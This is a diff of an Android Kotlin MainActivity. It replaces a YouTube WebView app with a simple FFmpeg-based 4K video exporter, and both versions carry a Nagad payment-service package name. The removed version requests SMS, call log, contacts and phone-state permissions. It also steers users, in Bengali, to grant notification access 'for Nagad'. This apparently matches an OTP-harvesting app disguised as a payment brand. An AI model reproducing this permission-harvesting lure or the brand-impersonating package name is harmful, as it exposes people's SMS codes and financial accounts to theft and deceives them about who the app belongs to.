@@ -1,192 +1,218 @@
-package com.konsal.nagad
+package com.konasl.nagad
 
-import android.Manifest
-import android.annotation.SuppressLint
+import android.content.ContentValues
 import android.content.Intent
-import android.content.pm.PackageManager
-import android.graphics.Bitmap
-import android.os.Build
+import android.graphics.Color
+import android.net.Uri
 import android.os.Bundle
-import android.provider.Settings
+import android.os.Environment
+import android.provider.MediaStore
+import android.provider.OpenableColumns
 import android.view.Gravity
-import android.view.View
-import android.webkit.WebChromeClient
-import android.webkit.WebSettings
-import android.webkit.WebView
-import android.webkit.WebViewClient
-import android.widget.FrameLayout
+import android.view.ViewGroup
+import android.widget.Button
+import android.widget.LinearLayout
 import android.widget.ProgressBar
+import android.widget.TextView
 import android.widget.Toast
-import androidx.activity.OnBackPressedCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.content.ContextCompat
+import com.arthenica.ffmpegkit.FFmpegKit
+import com.arthenica.ffmpegkit.FFmpegKitConfig
+import com.arthenica.ffmpegkit.ReturnCode
+import com.arthenica.ffmpegkit.Statistics
+import java.io.File
+import java.io.FileOutputStream
 
 class MainActivity : AppCompatActivity() {
 
-    private var webView: WebView? = null
-    private var progressBar: ProgressBar? = null
+    private lateinit var statusText: TextView
+    private lateinit var selectedFileText: TextView
+    private lateinit var progressBar: ProgressBar
+    private lateinit var exportButton: Button
+    private lateinit var selectButton: Button
 
-    // ম্যানিফেস্টে থাকা রানটাইম পারমিশনগুলোর তালিকা (অ্যান্ড্রয়েড ভার্সন অনুযায়ী)
-    private val requiredPermissions = mutableListOf(
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.CAMERA,
-        Manifest.permission.CALL_PHONE,
-        Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.SEND_SMS,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_PHONE_STATE
-    ).apply {
-        // অ্যান্ড্রয়েড ১৩ এর নিচের ভার্সনগুলোর জন্য স্টোরেজ পারমিশন
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
-            add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-    }.toTypedArray()
+    private var selectedVideoUri: Uri? = null
+    private var inputFilePath: String? = null
 
-    // পারমিশন রিকোয়েস্ট করার আধুনিক লজিক
-    private val requestMultiplePermissionsLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissions ->
-        var allGranted = true
-        permissions.entries.forEach {
-            if (!it.value) allGranted = false
-        }
-        
-        if (allGranted) {
-            checkNotificationListenerPermission()
-        } else {
-            Toast.makeText(this, "অ্যাপের সব ফিচার সচল করতে পারমিশনগুলো প্রয়োজন", Toast.LENGTH_LONG).show()
+    private val pickVideoLauncher = registerForActivityResult(
+        ActivityResultContracts.GetContent()
+    ) { uri: Uri? ->
+        if (uri != null) {
+            selectedVideoUri = uri
+            val name = getFileName(uri)
+            selectedFileText.text = "Selected: $name"
+            exportButton.isEnabled = true
+            statusText.text = "Ready to export"
         }
     }
 
-    @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-        // ১. রুট লেউআউট হিসেবে একটি FrameLayout তৈরি
-        val rootLayout = FrameLayout(this).apply {
-            layoutParams = FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.MATCH_PARENT,
-                FrameLayout.LayoutParams.MATCH_PARENT
-            )
-        }
-
-        // ২. WebView কনফিগারেশন
-        val view = WebView(this).apply {
-            layoutParams = FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.MATCH_PARENT,
-                FrameLayout.LayoutParams.MATCH_PARENT
-            )
-            
-            settings.apply {
-                javaScriptEnabled = true
-                domStorageEnabled = true
-                loadsImagesAutomatically = true
-                databaseEnabled = true
-                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-                
-                // ইউটিউবের ডেস্কটপ ভিউ বা প্রোপার মোবাইল রেসপন্সিভনেসের জন্য ইউজার এজেন্ট
-                userAgentString = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
-            }
-
-            webViewClient = object : WebViewClient() {
-                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
-                    super.onPageStarted(view, url, favicon)
-                    progressBar?.visibility = View.VISIBLE
-                }
-
-                override fun onPageFinished(view: WebView?, url: String?) {
-                    super.onPageFinished(view, url)
-                    progressBar?.visibility = View.GONE
-                }
-            }
-
-            webChromeClient = WebChromeClient()
-        }
-        webView = view
-
-        // ৩. বড় আকৃতির প্রোগ্রেস বার তৈরি
-        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge).apply {
-            layoutParams = FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.WRAP_CONTENT,
-                FrameLayout.LayoutParams.WRAP_CONTENT
-            ).apply {
-                gravity = Gravity.CENTER
-            }
-            visibility = View.GONE
-        }
-
-        // ৪. লেআউটে ভিউগুলো যুক্ত করা ও সেট করা
-        rootLayout.addView(webView)
-        rootLayout.addView(progressBar)
-        setContentView(rootLayout)
-
-        // ৫. ইউটিউব লোড করা
-        webView?.loadUrl("https://www.youtube.com")
-
-        // ৬. নিরাপদ ব্যাক বাটন নেভিগেশন
-        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
-            override fun handleOnBackPressed() {
-                val currentWebView = webView
-                if (currentWebView != null && currentWebView.canGoBack()) {
-                    currentWebView.goBack()
-                } else {
-                    finish() // কোনো রুপ বা ক্র্যাশ ছাড়াই অ্যাপ ক্লোজ হবে
-                }
-            }
-        })
-
-        // ৭. রানটাইমে পারমিশন চেক করা ও চাওয়া
-        checkAndRequestPermissions()
+        setContentView(buildUi())
     }
 
-    private fun checkAndRequestPermissions() {
-        val missingPermissions = requiredPermissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+    private fun buildUi(): ViewGroup {
+        val root = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            setPadding(48, 48, 48, 48)
         }
 
-        if (missingPermissions.isNotEmpty()) {
-            requestMultiplePermissionsLauncher.launch(missingPermissions.toTypedArray())
-        } else {
-            checkNotificationListenerPermission()
+        val title = TextView(this).apply {
+            text = "4K Video Exporter"
+            textSize = 22f
+            setTextColor(Color.BLACK)
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 40)
         }
+
+        selectButton = Button(this).apply {
+            text = "Select Video"
+            setOnClickListener { pickVideoLauncher.launch("video/*") }
+        }
+
+        selectedFileText = TextView(this).apply {
+            text = "No video selected"
+            setPadding(0, 24, 0, 24)
+            gravity = Gravity.CENTER
+        }
+
+        exportButton = Button(this).apply {
+            text = "Export to 4K"
+            isEnabled = false
+            setOnClickListener { startExport() }
+        }
+
+        progressBar = ProgressBar(
+            this, null, android.R.attr.progressBarStyleHorizontal
+        ).apply {
+            max = 100
+            progress = 0
+            layoutParams = LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.WRAP_CONTENT
+            ).apply { topMargin = 32 }
+        }
+
+        statusText = TextView(this).apply {
+            text = "Select a video to begin"
+            setPadding(0, 24, 0, 0)
+            gravity = Gravity.CENTER
+        }
+
+        root.addView(title)
+        root.addView(selectButton)
+        root.addView(selectedFileText)
+        root.addView(exportButton)
+        root.addView(progressBar)
+        root.addView(statusText)
+
+        return root
     }
 
-    // ম্যানিফেস্টে থাকা NotificationListenerService-এর জন্য বিশেষ অ্যাক্সেস অনুমতি চেক
-    private fun checkNotificationListenerPermission() {
-        val pkgName = packageName
-        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
-        val isEnabled = flat != null && flat.contains(pkgName)
-        
-        if (!isEnabled) {
-            // ইউজারকে সেটিংস পেজে নিয়ে যাওয়া যাতে সে ম্যানুয়ালি পারমিশন অন করতে পারে
-            Toast.makeText(this, "Nagad অ্যাপের জন্য নোটিফিকেশন অ্যাক্সেস চালু করুন", Toast.LENGTH_LONG).show()
+    private fun getFileName(uri: Uri): String {
+        var name = "video"
+        contentResolver.query(uri, null, null, null, null)?.use { cursor ->
+            val nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
+            if (cursor.moveToFirst() && nameIndex >= 0) {
+                name = cursor.getString(nameIndex)
+            }
+        }
+        return name
+    }
+
+    private fun copyUriToCache(uri: Uri): String {
+        val inputStream = contentResolver.openInputStream(uri)
+        val cacheFile = File(cacheDir, "input_${System.currentTimeMillis()}.mp4")
+        FileOutputStream(cacheFile).use { output ->
+            inputStream?.copyTo(output)
+        }
+        inputStream?.close()
+        return cacheFile.absolutePath
+    }
+
+    private fun startExport() {
+        val uri = selectedVideoUri ?: return
+
+        exportButton.isEnabled = false
+        selectButton.isEnabled = false
+        statusText.text = "Preparing..."
+        progressBar.progress = 0
+
+        Thread {
             try {
-                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                inputFilePath = copyUriToCache(uri)
+                val outputFile = File(cacheDir, "output_4k_${System.currentTimeMillis()}.mp4")
+                val outputPath = outputFile.absolutePath
+
+                val command = "-y -i \"$inputFilePath\" " +
+                        "-vf \"scale=3840:2160:force_original_aspect_ratio=decrease," +
+                        "pad=3840:2160:(ow-iw)/2:(oh-ih)/2\" " +
+                        "-c:v libx264 -preset medium -crf 18 " +
+                        "-c:a aac -b:a 192k " +
+                        "\"$outputPath\""
+
+                runOnUiThread { statusText.text = "Exporting to 4K..." }
+
+                FFmpegKitConfig.enableStatisticsCallback { statistics: Statistics ->
+                    val timeMs = statistics.time
+                    runOnUiThread {
+                        if (timeMs > 0) {
+                            statusText.text = "Exporting... (${timeMs / 1000}s processed)"
+                        }
+                    }
+                }
+
+                val session = FFmpegKit.execute(command)
+
+                runOnUiThread {
+                    if (ReturnCode.isSuccess(session.returnCode)) {
+                        saveToGallery(outputFile)
+                        statusText.text = "Export complete! Saved to gallery."
+                        progressBar.progress = 100
+                        Toast.makeText(
+                            this,
+                            "4K export successful",
+                            Toast.LENGTH_LONG
+                        ).show()
+                    } else {
+                        statusText.text = "Export failed: ${session.failStackTrace ?: session.returnCode}"
+                        Toast.makeText(
+                            this,
+                            "Export failed",
+                            Toast.LENGTH_LONG
+                        ).show()
+                    }
+                    exportButton.isEnabled = true
+                    selectButton.isEnabled = true
+                }
             } catch (e: Exception) {
-                e.printStackTrace()
+                runOnUiThread {
+                    statusText.text = "Error: ${e.message}"
+                    exportButton.isEnabled = true
+                    selectButton.isEnabled = true
+                }
+            }
+        }.start()
+    }
+
+    private fun saveToGallery(file: File) {
+        val values = ContentValues().apply {
+            put(MediaStore.Video.Media.DISPLAY_NAME, "4K_${file.name}")
+            put(MediaStore.Video.Media.MIME_TYPE, "video/mp4")
+            put(MediaStore.Video.Media.RELATIVE_PATH, Environment.DIRECTORY_MOVIES + "/Video4KExport")
+        }
+
+        val resolver = contentResolver
+        val uri = resolver.insert(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, values)
+
+        uri?.let {
+            resolver.openOutputStream(it)?.use { outStream ->
+                file.inputStream().use { inStream ->
+                    inStream.copyTo(outStream)
+                }
             }
         }
-    }
-
-    override fun onPause() {
-        super.onPause()
-        webView?.onPause()
-    }
-
-    override fun onResume() {
-        super.onResume()
-        webView?.onResume()
-    }
-
-    override fun onDestroy() {
-        webView?.let {
-            it.stopLoading()
-            it.destroy()
-        }
-        webView = null
-        progressBar = null
-        super.onDestroy()
     }
 }
